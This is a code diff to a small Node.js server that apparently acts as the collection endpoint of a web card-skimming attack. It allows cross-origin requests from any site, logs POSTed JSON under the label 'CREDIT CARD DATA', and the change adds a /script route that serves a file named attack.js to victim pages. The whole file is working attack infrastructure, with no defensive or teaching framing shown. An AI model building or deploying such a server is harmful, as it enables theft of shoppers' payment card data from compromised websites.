@@ -1,20 +1,10 @@
 const http = require("http");
+const fs = require("fs/promises");
 
 const PORT = 3000;
 
-const server = http.createServer((req, res) => {
-  res.setHeader("Access-Control-Allow-Origin", "*");
-
-  if (req.method === "GET" && req.url === "/api/data") {
-    console.log("GET /api/data");
-    res.writeHead(200, { "Content-Type": "application/json" });
-    res.end(
-      JSON.stringify({
-        message: "Test succeeded!",
-      }),
-    );
-  } else if (req.method === "POST" && req.url === "/api/data") {
-    console.log("POST /api/data");
+function getRequestBody(req) {
+  return new Promise((resolve, reject) => {
     let body = "";
 
     req.on("data", (chunk) => {
@@ -22,21 +12,54 @@ const server = http.createServer((req, res) => {
     });
 
     req.on("end", () => {
-      try {
-        const parsedData = JSON.parse(body);
-        console.log("CREDIT CARD DATA", parsedData);
-
-        res.writeHead(200, { "Content-Type": "application/json" });
-        res.end();
-      } catch (error) {
-        res.writeHead(400, { "Content-Type": "application/json" });
-        res.end(JSON.stringify({ error: "Invalid JSON payload format" }));
-      }
+      resolve(body);
     });
-  } else {
-    res.writeHead(404, { "Content-Type": "application/json" });
-    res.end(JSON.stringify({ error: "Route not found" }));
+
+    req.on("error", (err) => {
+      reject(err);
+    });
+  });
+}
+
+const server = http.createServer(async (req, res) => {
+  res.setHeader("Access-Control-Allow-Origin", "*");
+
+  if (req.method === "GET") {
+    if (req.url === "/script") {
+      const js = await fs.readFile("./attack.js", {
+        encoding: "utf-8",
+      });
+      res.writeHead(200, { "content-type": "text/javascript" });
+      res.end(js);
+      return;
+    }
+
+    if (req.url === "/api/data") {
+      console.log("GET /api/data");
+      res.writeHead(200, { "Content-Type": "application/json" });
+      res.end(
+        JSON.stringify({
+          message: "Test succeeded!",
+        }),
+      );
+      return;
+    }
   }
+
+  if (req.method === "POST") {
+    if (req.url === "/api/data") {
+      console.log("POST /api/data");
+      const reqBody = await getRequestBody(req);
+      const parsedBody = JSON.parse(reqBody);
+      console.log("CREDIT CARD DATA", parsedBody);
+      res.writeHead(200, { "Content-Type": "application/json" });
+      res.end();
+      return;
+    }
+  }
+
+  res.writeHead(404, { "Content-Type": "application/json" });
+  res.end(JSON.stringify({ error: "Route not found" }));
 });
 
 server.listen(PORT, () => {
